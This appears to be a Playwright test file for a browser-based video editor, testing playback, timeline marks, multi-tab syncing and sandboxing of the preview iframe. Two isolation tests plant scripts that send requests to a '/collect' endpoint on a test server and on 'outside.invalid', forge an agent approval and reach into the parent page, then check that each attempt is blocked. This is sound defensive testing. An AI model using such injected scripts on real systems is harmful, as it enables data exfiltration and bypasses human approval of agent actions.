import { readFile, writeFile } from "node:fs/promises";
import { createServer } from "node:http";
import { join } from "node:path";
import { expect, test } from "./fixtures";
import type { Request } from "@playwright/test";
import { ProjectDocumentSchema, ProjectSchema } from "../src/shared/project";
import { TimelineViewSchema } from "../src/shared/timeline/schema";
import { parseTimecode } from "../src/shared/timeline/timecode";

test("queued preview state cannot undo a seek before playback commands arrive", async ({
  page,
  request,
}) => {
  // Register before the bridge, so queued commands really stay outside the runtime.
  await page.addInitScript(() => {
    type Control = { source: string; action: string; id: string };
    const queued: MessageEvent<Control>[] = [];
    let holding = false;
    window.addEventListener("test-hold-playback", () => {
      holding = true;
    });
    window.addEventListener("test-release-playback", () => {
      holding = false;
      for (const event of queued.splice(0))
        window.dispatchEvent(
          new MessageEvent("message", {
            data: event.data,
            source: event.source,
            origin: event.origin,
          }),
        );
    });
    window.addEventListener("message", (event: MessageEvent<Control>) => {
      if (
        !holding ||
        event.data?.source !== "cutroom-viewer" ||
        !["pause", "seek", "play"].includes(event.data.action)
      )
        return;
      event.stopImmediatePropagation();
      if (!queued.length)
        document.documentElement.dataset.firstHeldPlayback = event.data.id;
      queued.push(event);
      document.documentElement.dataset.heldPlayback = event.data.action;
    });
  });
  const project = ProjectSchema.parse(
    await (
      await request.post("/api/cutroom/projects", {
        data: { name: "Pending playback", duration: 12 },
      })
    ).json(),
  );
  await page.goto(`/#project/${project.id}`);
  await expect(page.locator(".edit-stage")).toHaveAttribute(
    "data-handoff",
    "showing",
  );
  const element = await page.locator("iframe[data-live]").elementHandle();
  const frame = await element?.contentFrame();
  if (!frame) throw new Error("The live preview frame is missing.");
  const time = page.getByRole("button", { name: /^Current time/ });
  const seek = async (value: string) => {
    await time.click();
    await page.getByLabel("Go to time").pressSequentially(value);
    await page.keyboard.press("Enter");
  };
  await seek("0715");
  await frame.evaluate(() =>
    window.dispatchEvent(new Event("test-hold-playback")),
  );
  try {
    await seek("0315");
    await page
      .getByRole("button", { name: "Play forward", exact: true })
      .click();
    await expect(frame.locator("html")).toHaveAttribute(
      "data-held-playback",
      "play",
    );
    const received = await page.evaluateHandle(() => ({
      received: new Promise<(string | null)[]>((resolve) => {
        const observe = (event: MessageEvent<{ probe?: string }>) => {
          if (event.data?.probe !== "stale-playback") return;
          window.removeEventListener("message", observe);
          const shown: (string | null)[] = [];
          const sample = () => {
            shown.push(
              document.querySelector(".edit-now")?.textContent ?? null,
            );
            if (shown.length === 2) resolve(shown);
            else requestAnimationFrame(sample);
          };
          requestAnimationFrame(sample);
        };
        window.addEventListener("message", observe);
      }),
    }));
    // Old state and an earlier command's reply can arrive while the latest play is pending.
    // Retain each painted time: waiting for the final text would miss a one-frame jump.
    await frame.evaluate(() => {
      parent.postMessage(
        {
          source: "hf-preview",
          type: "state",
          currentTime: 7.5,
          isPlaying: false,
        },
        "*",
      );
      parent.postMessage(
        {
          source: "cutroom-preview",
          id: document.documentElement.dataset.firstHeldPlayback,
          probe: "stale-playback",
          state: {
            ready: true,
            root: true,
            error: null,
            width: 1920,
            height: 1080,
            fps: null,
            time: 7.5,
            playing: false,
          },
        },
        "*",
      );
    });
    const shown = await received.evaluate(({ received }) => received);
    await received.dispose();
    expect(shown).toEqual(["00:00:03:15", "00:00:03:15"]);
  } finally {
    await frame.evaluate(() =>
      window.dispatchEvent(new Event("test-release-playback")),
    );
  }
  await expect(time).not.toHaveText("00:00:03:15");
  expect(
    parseTimecode((await time.textContent())!.replaceAll(":", ""), {
      num: 30,
      den: 1,
    }),
  ).toBeLessThan(225);
  await page.getByRole("button", { name: "Stop", exact: true }).click();
});

test("three editor tabs share project and preview events without exhausting HTTP connections", async ({
  context,
  page,
  request,
}) => {
  const project = ProjectSchema.parse(
    await (
      await request.post("/api/cutroom/projects", {
        data: { name: "Three tabs" },
      })
    ).json(),
  );
  const tabs = [page, await context.newPage(), await context.newPage()];
  const streams = tabs.map((tab) => {
    const active = new Set<Request>();
    tab.on("request", (request) => {
      if (request.resourceType() === "eventsource") active.add(request);
    });
    tab.on("requestfailed", (request) => active.delete(request));
    tab.on("requestfinished", (request) => active.delete(request));
    return active;
  });
  try {
    for (const tab of tabs) {
      await tab.goto(`/#project/${project.id}`);
      await expect(
        tab.frameLocator("iframe[data-live]").locator("#headline"),
      ).toHaveText("Three tabs");
    }
    await expect
      .poll(() =>
        streams.map((active) =>
          [...active].map((request) => new URL(request.url()).pathname),
        ),
      )
      .toEqual(tabs.map(() => [`/api/cutroom/projects/${project.id}/events`]));
    // These fetches use Chromium's shared HTTP/1.1 pool, unlike APIRequestContext.
    for (const tab of tabs) {
      expect(
        await tab.evaluate(
          async () => (await fetch("/api/cutroom/status")).status,
        ),
      ).toBe(200);
    }
    const index = join(project.path, "index.html");
    await writeFile(
      index,
      (await readFile(index, "utf8"))
        .replaceAll("Three tabs", "All tabs updated")
        .replace(
          'id="headline"',
          'id="headline" data-label="All tabs updated"',
        ),
    );
    for (const tab of tabs) {
      await expect(
        tab.frameLocator("iframe[data-live]").locator("#headline"),
      ).toHaveText("All tabs updated");
      await expect(tab.locator('[data-clip-label="headline"]')).toContainText(
        "All tabs updated",
      );
    }
  } finally {
    for (const tab of tabs.slice(1)) await tab.close();
  }
});

test("a sandboxed viewer cannot navigate to an unrestricted preview and send an external request", async ({
  page,
  request,
}) => {
  let externalRequests = 0;
  const external = createServer((_request, response) => {
    externalRequests++;
    response.writeHead(200, { "Access-Control-Allow-Origin": "*" });
    response.end("received");
  });
  await new Promise<void>((resolve) =>
    external.listen(0, "127.0.0.1", resolve),
  );
  const address = external.address();
  if (!address || typeof address === "string")
    throw new Error("The external test server has no TCP address.");
  try {
    // A browser permission must not hide a missing server-side boundary.
    await page.context().grantPermissions(["local-network-access"]);
    const project = ProjectSchema.parse(
      await (
        await request.post("/api/cutroom/projects", {
          data: { name: "Navigation isolation" },
        })
      ).json(),
    );
    const oldPreview = `/api/projects/${project.id}/preview/evil.html`;
    await writeFile(
      join(project.path, "evil.html"),
      `<!doctype html><html><body id="escaped"><script>
      fetch(${JSON.stringify(`http://127.0.0.1:${address.port}/collect?marker=escaped-preview`)});
    </script></body></html>`,
    );
    // The old route remains available to the trusted parent and native clients.
    expect((await request.get(oldPreview)).status()).toBe(200);
    await page.addInitScript(() => {
      if (window === window.top)
        localStorage.setItem("cutroom.newEditor", "true");
    });
    await page.goto(`/#project/${project.id}`);
    await expect(
      page.frameLocator("iframe[data-live]").locator("#headline"),
    ).toHaveText(project.name);
    const iframe = page.locator("iframe[data-live]");
    const element = await iframe.elementHandle();
    const frame = await element?.contentFrame();
    if (!frame) throw new Error("The live preview frame is missing.");
    // Exercise server enforcement without relying on Connection-Allowlist support.
    // Reload the resolved URL because Playwright cannot intercept a redirect's target.
    await page.route("**/api/isolated/**", async (route) => {
      const response = await route.fetch();
      const headers = response.headers();
      delete headers["connection-allowlist"];
      await route.fulfill({ response, headers });
    });
    const reloaded = page.waitForResponse(
      (response) =>
        response.url() === frame.url() &&
        response.request().isNavigationRequest(),
    );
    await iframe.evaluate(
      (element, url) => element.setAttribute("src", url),
      frame.url(),
    );
    await reloaded;
    await expect(frame.locator("#headline")).toHaveText(project.name);
    const navigated = page.waitForResponse(
      (response) =>
        response.url().endsWith(oldPreview) &&
        response.request().isNavigationRequest(),
    );
    await frame.evaluate((url) => {
      location.href = url;
    }, oldPreview);
    const response = await navigated;
    await frame.waitForLoadState("networkidle");
    expect(externalRequests).toBe(0);
    expect(response.status()).toBe(403);
    await expect(frame.locator("#escaped")).toHaveCount(0);
  } finally {
    await new Promise<void>((resolve, reject) =>
      external.close((error) => (error ? reject(error) : resolve())),
    );
  }
});

test("the new viewer refuses composition API calls and parent access while remaining playable", async ({
  page,
  request,
}, testInfo) => {
  const project = ProjectSchema.parse(
    await (
      await request.post("/api/cutroom/projects", {
        data: { name: "Untrusted preview" },
      })
    ).json(),
  );
  const index = join(project.path, "index.html");
  const source = await readFile(index, "utf8");
  const script = `<script>
    (async () => {
      const results = {};
      const post = body => ({method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify(body)});
      const attempts = {
        annotation: () => fetch("/api/cutroom/projects/${project.id}/annotations", post({kind:"comment",body:"untrusted",time:0})),
        approval: () => fetch("/api/cutroom/agents/sessions/forbidden/responses", post({requestId:"approval",decision:"allow"})),
        projects: () => fetch("/api/cutroom/projects"),
        parent: () => parent.document.body,
        external: () => fetch("https://outside.invalid/collect")
      };
      for (const [name, attempt] of Object.entries(attempts)) {
        try { await attempt(); results[name] = "allowed"; } catch { results[name] = "blocked"; }
      }
      document.querySelector("main").setAttribute("data-attacks", JSON.stringify(results));
    })();
  </script>`;
  await writeFile(index, source.replace("</body>", `${script}</body>`));
  await page.addInitScript(() =>
    localStorage.setItem("cutroom.newEditor", "true"),
  );
  await page.goto(`/#project/${project.id}`);
  const live = page.frameLocator("iframe[data-live]");
  await expect(live.locator("main")).toHaveAttribute(
    "data-attacks",
    JSON.stringify({
      annotation: "blocked",
      approval: "blocked",
      projects: "blocked",
      parent: "blocked",
      external: "blocked",
    }),
  );
  await expect(page.locator("iframe[data-live]")).toHaveAttribute(
    "sandbox",
    "allow-scripts",
  );
  const document = ProjectDocumentSchema.parse(
    await (
      await request.get(`/api/cutroom/projects/${project.id}/document`)
    ).json(),
  );
  expect(document.annotations).toEqual([]);
  await page.getByRole("region", { name: "Viewer" }).click();
  await page.keyboard.press("l");
  await expect(
    page.getByRole("button", { name: /^Current time/ }),
  ).not.toHaveText("00:00:00:00");
  await page.keyboard.press("k");
  await expect(page.locator(".status-error")).toHaveCount(0);
  await page.screenshot({ path: testInfo.outputPath("isolated-viewer.png") });
});

test("the new editor plays, steps, and marks in and out as undoable timeline edits", async ({
  page,
  request,
}) => {
  const project = ProjectSchema.parse(
    await (
      await request.post("/api/cutroom/projects", {
        data: { name: "Own viewer" },
      })
    ).json(),
  );
  const range = async () =>
    TimelineViewSchema.parse(
      await (
        await request.get(`/api/cutroom/projects/${project.id}/timeline`)
      ).json(),
    ).timeline.range;
  await page.goto(`/#project/${project.id}`);

  const preview = page.frameLocator("iframe[title='Composition preview']");
  await expect(preview.locator("#headline")).toHaveText("Own viewer");
  const now = page.getByRole("button", { name: /^Current time/ });
  const play = page.getByRole("button", { name: "Play forward" });
  const stop = page.getByRole("button", { name: "Stop" });
  await expect(now).toHaveText("00:00:00:00");
  await expect(
    page.getByRole("region", { name: "Viewer" }).getByText("00:00:12:00"),
  ).toBeVisible();

  // Typing never drives the transport.
  const composer = page.getByPlaceholder("Describe the next edit");
  await composer.fill("");
  await composer.press("l");
  await composer.press("Space");
  await expect(stop).toHaveAttribute("aria-pressed", "true");
  await expect(composer).toHaveValue("l ");
  await composer.fill("");
  await page.getByRole("region", { name: "Viewer" }).click();

  await page.keyboard.press("l");
  await expect(play).toHaveAttribute("aria-pressed", "true");
  await expect(now).not.toHaveText("00:00:00:00");
  await page.keyboard.press("l");
  await expect(page.getByLabel("Shuttle speed")).toHaveText("2x");
  await page.keyboard.press("k");
  await expect(stop).toHaveAttribute("aria-pressed", "true");
  await expect(page.getByLabel("Shuttle speed")).toHaveText("");

  await page.keyboard.press("Home");
  await page.keyboard.press("ArrowRight");
  await page.keyboard.press("ArrowRight");
  await expect(now).toHaveText("00:00:00:02");
  await page.keyboard.press("Shift+ArrowRight");
  await expect(now).toHaveText("00:00:01:02");

  await page.keyboard.press("i");
  await page.keyboard.press("Shift+ArrowRight");
  await page.keyboard.press("o");
  await expect(
    page.getByText(/In\s*00:00:01:02\s*Out\s*00:00:02:02/),
  ).toBeVisible();
  // The marks show before the server answers, so its copy is read until it catches up.
  await expect.poll(range).toEqual({ in: 32, out: 63 });

  await page.keyboard.press("Shift+i");
  await expect(now).toHaveText("00:00:01:02");

  await page.keyboard.press("Control+z");
  await expect.poll(range).toEqual({ in: 32, out: null });
  await expect(page.getByText("Out", { exact: true })).toHaveCount(0);

  // A typed time seeks; digits fill from the right.
  await now.click();
  await page.keyboard.type("504");
  await page.keyboard.press("Enter");
  await expect(now).toHaveText("00:00:05:04");

  // Marks and undo pressed faster than the server answers apply in order.
  await page.keyboard.press("Alt+x");
  await expect.poll(range).toEqual({ in: null, out: null });
  await page.keyboard.press("Home");
  await page.keyboard.press("Shift+ArrowRight");
  await page.keyboard.press("i");
  await page.keyboard.press("o");
  await page.keyboard.press("Backquote");
  await expect.poll(range).toEqual({ in: 30, out: null });
  await expect(page.getByText(/In\s*00:00:01:00/)).toBeVisible();
  await expect(page.locator(".status-error")).toHaveCount(0);
});

test("a composition that cannot play keeps the last picture and says why", async ({
  page,
  request,
}) => {
  const project = ProjectSchema.parse(
    await (
      await request.post("/api/cutroom/projects", {
        data: { name: "Held picture" },
      })
    ).json(),
  );
  await page.goto(`/#project/${project.id}`);
  const live = page.frameLocator("iframe[data-live]");
  await expect(live.locator("#headline")).toHaveText("Held picture");

  const index = join(project.path, "index.html");
  const good = await readFile(index, "utf8");
  await writeFile(index, "<!doctype html><main>No composition</main>\n");
  await expect(page.locator(".status-error")).toContainText(
    "data-composition-id",
  );
  await expect(page.locator("iframe[title='Composition preview']")).toHaveCount(
    1,
  );
  await expect(live.locator("#headline")).toHaveText("Held picture");

  // Fixing the file brings the picture back and clears the report.
  await writeFile(
    index,
    good.replace("Drop media in, or ask your agent to start.", "Back again."),
  );
  await expect(live.locator("#caption")).toHaveText("Back again.");
  await expect(page.locator(".status-error")).toHaveCount(0);
});

test("a timeline the engine refuses stays reported after the picture reloads", async ({
  page,
  request,
}) => {
  const project = ProjectSchema.parse(
    await (
      await request.post("/api/cutroom/projects", {
        data: { name: "Refused timeline" },
      })
    ).json(),
  );
  await page.goto(`/#project/${project.id}`);
  const live = page.frameLocator("iframe[data-live]");
  await expect(live.locator("#headline")).toHaveText("Refused timeline");

  // The runtime plays a clip without a length; the engine cannot place it.
  const index = join(project.path, "index.html");
  await writeFile(
    index,
    (await readFile(index, "utf8")).replace(
      "</main>",
      '<div id="extra" class="clip" data-start="1" data-track-index="3">Extra</div></main>',
    ),
  );
  // The reloaded picture arrives after the engine's refusal and must not hide it.
  await expect(live.locator("#extra")).toHaveCount(1);
  const status = page.locator(".status-error");
  await expect(status).toContainText("Clip extra has no data-duration");
  await page.waitForTimeout(500);
  await expect(status).toContainText("Clip extra has no data-duration");
});

test("a seek made while an edited preview takes the screen is drawn by that preview", async ({
  page,
  request,
}) => {
  const project = ProjectSchema.parse(
    await (
      await request.post("/api/cutroom/projects", {
        data: { name: "Seek during a handoff", duration: 4 },
      })
    ).json(),
  );
  const index = join(project.path, "index.html");
  const title = (text: string) =>
    `<div id="late" class="clip" data-start="1" data-duration="2" data-track-index="3">${text}</div></main>`;
  const starter = await readFile(index, "utf8");
  await writeFile(index, starter.replace("</main>", title("Before")));
  await page.goto(`/#project/${project.id}`);
  const stage = page.locator(".edit-stage");
  await expect(stage).toHaveAttribute("data-handoff", "showing");
  const live = page.frameLocator("iframe[data-live]");
  await expect(live.locator("#late")).toBeHidden();

  // Hold the next document's confirming paint, so it stays on screen unconfirmed.
  await page.addInitScript(() => {
    if (window === window.top) return;
    let presented = false;
    window.addEventListener(
      "message",
      (event) => {
        if (event.data?.source !== "cutroom-viewer") return;
        if (event.data.action === "observe-position") presented = true;
        if (presented && event.data.action === "paint")
          event.stopImmediatePropagation();
      },
      true,
    );
  });
  await writeFile(index, starter.replace("</main>", title("After")));
  await expect(stage).toHaveAttribute("data-handoff", "promoting");
  await expect(live.locator("#late")).toHaveText("After");
  await expect(live.locator("#late")).toBeHidden();

  await page.getByRole("button", { name: /^Current time/ }).click();
  await page.getByLabel("Go to time").pressSequentially("00000115");
  await page.keyboard.press("Enter");
  // The edited document covers the retained one, so it has to show the new frame itself,
  // well before the held handoff gives up and the retained document returns.
  await expect(live.locator("#late")).toBeVisible({ timeout: 5_000 });
  await expect(stage).toHaveAttribute("data-handoff", "promoting");
});
